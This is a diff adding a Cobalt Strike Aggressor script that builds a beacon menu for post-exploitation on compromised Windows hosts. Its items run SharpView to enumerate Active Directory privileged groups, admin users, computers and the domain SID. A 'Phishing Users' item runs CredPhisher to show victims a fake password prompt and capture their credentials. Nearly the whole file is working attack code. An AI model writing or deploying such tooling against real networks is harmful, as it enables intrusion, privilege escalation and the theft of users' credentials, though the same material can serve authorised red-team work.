@@ -1,0 +1,192 @@
+##########################
+##Define the pop up menu name
+##
+##########################
+
+popup beacon_top {
+	menu "Enumeration" {
+
+
+##########################
+##List All Items in Pop Up Menu
+##
+##########################
+
+menu "Domain Group Enumeration"
+{
+########List Groups in Domain##################
+		item "Enterprise Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupenterpriseadmin($bid);
+				}
+			}
+			
+		item "Domain Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupdomainadmin($bid);
+				}
+			}
+			
+		item "Schema Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupschemaadmin($bid);
+				}
+			}
+		
+		item "Account Operator"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupaccountoperator($bid);
+				}
+			}
+					
+			
+		item "Administrator"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupadministrator($bid);
+				}
+			}
+			
+############			
+}
+
+menu "Domain User Enumeration"
+{
+########List People in Domain##################
+					
+		item "List Admins in Domain"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetuseradmin($bid);
+				}
+			}
+}
+
+menu "Phishing Users"
+{
+########Run CredPhisher##################
+					
+		item "Prompt for Username and Password"{
+			local('$bid');
+				foreach $bid ($1){
+					credphisher($bid);
+				}
+			}
+}
+
+menu "Domain Computer Object Enumeration"
+{
+	
+########List computers in Domain##################
+					
+		item "List Computers"{
+			local('$bid');
+				foreach $bid ($1){
+					getdomaincomputer($bid);
+				}
+			}
+		
+
+}
+
+menu "Domain/Forest Enumeration"
+{
+########List Domains/Forest in Domain##################
+					
+		
+########Get Domain Security Identifier (SID)#######
+		item "List Domain SID"{
+			local('$bid');
+				foreach $bid ($1){
+					getdomainsid($bid);
+					}
+				}
+}
+
+menu "Trust"
+########List Trust in Domain##################
+{					
+	
+}
+
+					
+					
+
+	
+	
+
+
+
+
+################
+## These last two brackets close out the above functions
+##
+##
+################
+		}
+	}
+  
+
+
+###########################
+##Define variables for functions e.g., sub
+##
+###########################
+
+sub getdomainsid{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");
+
+}
+
+sub getdomaincomputer{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainComputer");
+
+}
+
+sub getnetuseradmin{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetUser -AdminCount");
+
+}
+
+sub getnetgroupenterpriseadmin{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Enterprise Admins" -Recursive');
+
+}
+
+sub getnetgroupdomainadmin{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Domain Admins" -Recursive');
+
+}
+
+sub getnetgroupschemaadmin{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Schema Admins" -Recursive');
+
+}
+
+sub getnetgroupaccountoperator{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Account Operators" -Recursive');
+
+}
+
+sub getnetgroupadministrator{
+
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Administrators" -Recursive');
+
+}
+
+sub credphisher{
+
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+
+}
